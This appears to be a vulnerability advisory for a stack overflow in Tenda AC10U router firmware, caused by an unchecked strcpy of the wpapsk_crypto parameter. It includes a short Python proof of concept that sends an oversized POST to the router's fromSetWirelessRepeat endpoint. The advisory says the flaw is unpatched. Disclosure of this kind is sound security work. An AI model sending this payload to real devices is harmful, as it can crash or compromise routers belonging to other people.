# Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 was discovered to contain a stack overflow via the wpapsk_crypto parameter in the fromSetWirelessRepeat function.

## Vulnerability Description

Vendor: Tenda

Product: AC10U

Version: US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01

Type: Buffer Overflow

Firmware link: https://www.tendacn.com/download/detail-3795.html

## Vulnerability Details

The function "fromSetWirelessRepeat" retrieves the parameter "wpapsk_crypto" using "websGetVar",  the value of "wpapsk_crypto" is passed into function strcpy without any length check, and stored in "wpapsk_cryptovalue_0". It can cause a stack overflow if the size of the data we enter exceeds the size of "wpapsk_cryptovalue_0".

![1705413534215](image/fromSetWirelessRepeat/1705413534215.png)

![1705413554510](image/fromSetWirelessRepeat/1705413554510.png)

## **Recurring vulnerabilities and POC**

```python
import requests
ip = '192.168.159.128'
url = f'http://{ip}/goform/fromSetWirelessRepeat'
payload = {
    "wpapsk_crypto": 'a'*0x500
}
res = requests.post(url=url, data=payload)
print(res.content)

```

## Solution

The vendor has not yet provided a fix for the vulnerability, please watch the vendor's homepage for updates:
https://www.tendacn.com/product/specification/ac10u.html
